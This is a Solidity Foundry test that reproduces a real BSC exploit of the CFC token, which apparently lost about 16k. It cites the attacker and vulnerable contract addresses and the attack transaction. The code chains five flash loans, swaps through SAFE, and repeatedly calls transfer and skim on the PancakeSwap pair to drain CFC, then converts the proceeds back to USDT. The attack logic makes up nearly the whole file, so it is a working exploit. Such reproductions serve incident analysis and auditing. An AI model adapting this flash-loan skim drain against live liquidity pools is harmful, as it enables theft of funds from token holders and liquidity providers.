// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~16k
// Attacker contract address : https://bscscan.com/address/0x8213e87bb381919b292ace364d97d3a1ee38caa4
// Vulnerable contract : https://bscscan.com/address/0xdd9b223aec6ea56567a62f21ff89585ff125632c
// Attack TX : https://explorer.phalcon.xyz/tx/bsc/0xa3c130ed8348919f73cbefce0f22d46fa381c8def93654e391ddc95553240c1e

// @Analysis : https://twitter.com/hexagate_/status/1669280632738906113 - Second TX

contract CFCTest is Test {
    IERC20 BEP20USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SAFE = IERC20(0x4d7Fa587Ec8e50bd0E9cD837cb4DA796f47218a1);
    IERC20 CFC = IERC20(0xdd9B223AEC6ea56567A62f21Ff89585ff125632c);
    IDPPOracle DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair CakeLP = IPancakePair(payable(0x595488F902C4d9Ec7236031a1D96cf63b0405CF0));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_116_478);
        cheats.label(address(BEP20USDT), "BEP20USDT");
        cheats.label(address(SAFE), "SAFE");
        cheats.label(address(CFC), "CFC");
        cheats.label(address(DPPOracle1), "DPPOracle1");
        cheats.label(address(DPPOracle2), "DPPOracle2");
        cheats.label(address(DPPOracle3), "DPPOracle3");
        cheats.label(address(DPP), "DPP");
        cheats.label(address(DPPAdvanced), "DPPAdvanced");
        cheats.label(address(Router), "Router");
        cheats.label(address(CakeLP), "CakeLP");
    }

    function testSkim() public {
        deal(address(BEP20USDT), address(this), 0);
        emit log_named_decimal_uint(
            "Attacker BEP20USDT balance before attack", BEP20USDT.balanceOf(address(this)), BEP20USDT.decimals()
        );

        takeFlashloan(DPPOracle1);

        emit log_named_decimal_uint(
            "Attacker BEP20USDT balance after attack", BEP20USDT.balanceOf(address(this)), BEP20USDT.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            takeFlashloan(DPPOracle2);
        } else if (msg.sender == address(DPPOracle2)) {
            takeFlashloan(DPPOracle3);
        } else if (msg.sender == address(DPPOracle3)) {
            takeFlashloan(DPP);
        } else if (msg.sender == address(DPP)) {
            takeFlashloan(DPPAdvanced);
        } else {
            BEP20USDT.approve(address(Router), type(uint256).max);
            CFC.approve(address(Router), type(uint256).max);
            SAFE.approve(address(Router), type(uint256).max);

            address[] memory path = new address[](2);
            path[0] = address(BEP20USDT);
            path[1] = address(SAFE);
            Router.swapExactTokensForTokens(13_000 * 1e18, 0, path, address(this), block.timestamp + 100);

            (uint256 reserveSAFE, uint256 reserveCFC,) = CakeLP.getReserves();

            uint256 amountOut = Router.getAmountOut(SAFE.balanceOf(address(this)), reserveSAFE, reserveCFC);

            CakeLP.swap(1, (amountOut - (amountOut / 250)) - 1, address(this), hex"307831323334");

            //Start exploit skim() function
            CFC.transfer(address(CakeLP), CFC.balanceOf(address(this)));
            CakeLP.skim(address(this));

            for (uint256 i; i < 18; ++i) {
                CFC.transfer(address(CakeLP), CFC.balanceOf(address(CakeLP)) - 1);
                CakeLP.skim(address(this));
            }
            //End exploit skim() function

            path[0] = address(CFC);
            path[1] = address(SAFE);
            Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                CFC.balanceOf(address(this)) / 40, 0, path, address(this), block.timestamp + 100
            );

            (reserveSAFE, reserveCFC,) = CakeLP.getReserves();
            uint256 transferAmountSAFE = Router.quote(CFC.balanceOf(address(this)), reserveCFC, reserveSAFE);

            SAFE.transfer(address(CakeLP), transferAmountSAFE);
            CFC.transfer(address(CakeLP), CFC.balanceOf(address(this)));
            CakeLP.mint(address(this));

            path[0] = address(SAFE);
            path[1] = address(BEP20USDT);
            Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                SAFE.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100
            );
        }
        //Repaying DPPOracle flashloans
        BEP20USDT.transfer(msg.sender, quoteAmount);
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        //Repaying CakeLP (Pair) flashswap
        SAFE.transfer(address(CakeLP), SAFE.balanceOf(address(this)));
    }

    function takeFlashloan(IDPPOracle Oracle) internal {
        Oracle.flashLoan(0, BEP20USDT.balanceOf(address(Oracle)), address(this), new bytes(1));
    }
}
